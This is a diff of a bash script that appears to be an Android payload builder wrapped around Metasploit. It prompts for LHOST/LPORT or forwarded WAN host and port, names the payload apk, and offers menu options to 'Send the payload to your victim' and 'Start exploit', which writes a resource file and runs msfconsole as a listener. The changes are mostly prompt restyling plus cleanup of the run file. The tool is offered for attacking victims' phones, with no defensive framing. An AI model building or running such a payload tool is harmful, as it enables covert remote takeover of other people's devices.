@@ -3,32 +3,32 @@ PWD=$(pwd)
 echo
 while true
 do
-printf "\e[1;31mYou are generating payload for (LAN/WAN) ==> \e[1;92m"
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mYou are generating payload for (LAN/WAN) ==> \e[1;92m"
 read lwan
 printf "\n"
 if [[ $lwan == LAN ]] || [[ $lwan == lan ]]; then
-printf "\e[1;31mEnter LHOST==>\e[0m "
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter LHOST==>\e[0m "
 read lht
 echo
-printf "\e[1;31mEnter LPORT==>\e[0m "
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter LPORT==>\e[0m "
 read lpt
 elif [[ $lwan == WAN ]] || [[ $lwan == wan ]]; then
-printf "\e[1;31mEnter forwarded HOST==>\e[0m "
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter forwarded HOST==>\e[0m "
 read flht
 echo
-printf "\e[1;31mEnter forwarded PORT==>\e[0m "
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter forwarded PORT==>\e[0m "
 read flpt
 echo
-printf "\e[1;31mEnter LPORT==>\e[0m "
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter LPORT==>\e[0m "
 read lpt
 break
 else
-printf "\e[1;31mERROR: PLEASE ENTER A VALID OPTION FROM (LAN/lan) and (WAN/wan)\e[0m\n"
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mERROR: PLEASE ENTER A VALID OPTION FROM (LAN/lan) and (WAN/wan)\e[0m\n"
 echo
 fi
 done
 printf "\n"
-printf "\e[1;31mEnter a name for your payload==>\e[0m "
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter a name for your payload==>\e[0m "
 read pld
 printf "\n"
 printf "\e[1;94mProcessing\e[0m"
@@ -57,13 +57,13 @@ printf "\n"
 printf "\e[1;33m\e[104mChoose any from option:-\e[0m\n"
 echo
 while true; do
-printf "\e[1;32m01. Send the payload to your victim\e[om\n"
-printf "\e[1;32m02. Install payload in this device\e[0m\n"
-printf "\e[1;32m03. Start exploit\e[0m\n"
-printf "\e[1;32m04. Remove the apk\e[0m\n"
-printf "\e[1;32m>>Run 'quit' to exit\e[0m\n"
+printf "\e[2;32m01. Send the payload to your victim\e[om\n"
+printf "\e[2;32m02. Install payload in this device\e[0m\n"
+printf "\e[2;32m03. Start exploit\e[0m\n"
+printf "\e[2;32m04. Remove the apk\e[0m\n"
+printf "\e[2;32m>>Run 'quit' to exit\e[0m\n"
 echo
-printf "\e[1;36mEnter your option==> \e[1;32m"
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;36mEnter your option==> \e[1;32m"
 read option
 echo
 if [[ $option == 1 ]] || [[ $option == 01 ]]
@@ -90,6 +90,7 @@ echo "show options" >> run
 echo "exploit" >> run
 msfconsole -r run
 cd - &> /dev/null
+cd $PRIFIX/tmp; rm -rf run
 cd $PWD
 elif [[ $option == 4 ]] || [[ $option == 04 ]]
 then
@@ -100,7 +101,7 @@ then
 unset PWD
 exit
 else
-printf "\e[1;31m>>>please choose a valid option\e[0m\n"
+printf "(•) \e[1;31m>>>please choose a valid option\e[0m\n"
 fi
 done
 
